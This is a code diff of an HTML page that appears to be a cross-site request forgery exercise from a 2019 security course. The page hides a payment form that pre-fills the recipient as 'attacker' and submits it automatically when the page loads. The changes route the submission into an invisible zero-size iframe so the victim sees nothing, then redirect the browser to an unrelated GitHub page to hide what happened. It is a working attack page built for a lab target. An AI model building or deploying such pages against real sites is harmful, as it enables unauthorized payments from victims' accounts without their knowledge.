@@ -7,9 +7,11 @@ form{visibility:hidden;}
 h3{visibility:hidden;}
 </style>
 </head>
+
+
 <div class="payment-form">
   <h3 class="payment-header">Make payment?</h3>
-  <form action="http://localhost:8080/pay" method="post">
+  <form action="http://localhost:8080/pay" method="post" target="temp">
     <div class="form-group">
       <div class="form-label">To:</div>
       <div class="form-input"><input name = "recipient" type = "text" value="attacker"/></div>
@@ -23,11 +25,17 @@ h3{visibility:hidden;}
 </div>
 
 
-<body  onload="document.forms[0].submit()">
+<body>
+	
+<iframe id="paymentSubmit" src="" name="temp" style="height:0;width:0;border:0;border:none"  ></iframe>
+<script> 
+	onload=document.forms[0].submit()
+</script>
 <script>
-	window.addEventListener("load",function(){
+	document.getElementById('paymentSubmit').onload = 
+	function() {
 		window.top.location.href = "http://github.com/tomrist/cs5435-fall2019"; 
-	});
+	};
 </script>
 	
 </body>
